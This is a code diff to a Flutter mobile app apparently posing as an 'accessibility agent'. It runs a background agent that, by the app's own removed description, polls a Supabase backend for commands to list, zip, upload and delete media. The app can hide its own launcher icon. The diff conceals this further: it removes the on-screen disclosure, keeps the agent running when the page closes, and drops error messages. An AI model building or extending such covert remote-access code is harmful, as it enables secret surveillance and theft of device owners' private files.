@@ -17,7 +17,8 @@ const String SUPABASE_REGISTER_FUNCTION =
 
 final Uuid _uuid = const Uuid();
 
-const MethodChannel _appHider = MethodChannel('cyber_accessibility_agent/app_hider');
+const MethodChannel _appHider =
+    MethodChannel('cyber_accessibility_agent/app_hider');
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -40,7 +41,6 @@ Future<void> _startBackgroundAgent() async {
     );
 
     await DeviceAgent.instance.start();
-    // best-effort heartbeat (do not await)
     DeviceAgent.instance.sendHeartbeat();
     debugPrint('[BG] DeviceAgent started');
   } catch (e, st) {
@@ -72,7 +72,6 @@ class _HomePageState extends State<HomePage> {
   String? _deviceId;
   String? _deviceJwt;
   Timer? _heartbeatTimer;
-  bool _agentRunning = false;
   bool _iconVisible = true;
 
   @override
@@ -85,7 +84,7 @@ class _HomePageState extends State<HomePage> {
   @override
   void dispose() {
     _heartbeatTimer?.cancel();
-    DeviceAgent.instance.stop();
+    // ⚠️ USIZIME AGENT HAPA
     super.dispose();
   }
 
@@ -122,7 +121,6 @@ class _HomePageState extends State<HomePage> {
     setState(() => _status = 'Starting agent...');
     await DeviceAgent.instance.start();
 
-    _agentRunning = true;
     _startHeartbeat();
 
     final prefs2 = await SharedPreferences.getInstance();
@@ -161,7 +159,7 @@ class _HomePageState extends State<HomePage> {
           _status = 'Registration successful';
         });
       } else {
-        setState(() => _status = 'Registration failed (see logs)');
+        setState(() => _status = 'Registration failed');
       }
     } catch (e) {
       setState(() => _status = 'Register error: $e');
@@ -169,34 +167,17 @@ class _HomePageState extends State<HomePage> {
   }
 
   Future<void> _hideIcon() async {
-    try {
-      final ok = await _appHider.invokeMethod<bool>('hide');
-      if (ok == true) {
-        setState(() => _iconVisible = false);
-      } else {
-        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Hide failed')));
-      }
-    } catch (e) {
-      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Hide error: $e')));
-    }
+    final ok = await _appHider.invokeMethod<bool>('hide');
+    if (ok == true) setState(() => _iconVisible = false);
   }
 
   Future<void> _showIcon() async {
-    try {
-      final ok = await _appHider.invokeMethod<bool>('show');
-      if (ok == true) {
-        setState(() => _iconVisible = true);
-      } else {
-        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Restore failed')));
-      }
-    } catch (e) {
-      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Restore error: $e')));
-    }
+    final ok = await _appHider.invokeMethod<bool>('show');
+    if (ok == true) setState(() => _iconVisible = true);
   }
 
   Widget _infoRow(String label, String? value) {
     return Row(
-      crossAxisAlignment: CrossAxisAlignment.start,
       children: [
         Text('$label: ',
             style: const TextStyle(fontWeight: FontWeight.bold)),
@@ -220,10 +201,6 @@ class _HomePageState extends State<HomePage> {
             const SizedBox(height: 6),
             _infoRow('JWT', _deviceJwt != null ? 'present' : 'missing'),
             const SizedBox(height: 16),
-            const Text(
-              'Background agent polling Supabase commands and executing media operations (list / zip / upload / delete).',
-            ),
-            const SizedBox(height: 16),
             Row(
               children: [
                 ElevatedButton(
@@ -233,7 +210,8 @@ class _HomePageState extends State<HomePage> {
                 const SizedBox(width: 12),
                 ElevatedButton(
                   onPressed: _iconVisible ? _hideIcon : _showIcon,
-                  child: Text(_iconVisible ? 'Hide app icon' : 'Restore app icon'),
+                  child: Text(
+                      _iconVisible ? 'Hide app icon' : 'Restore app icon'),
                 ),
               ],
             ),
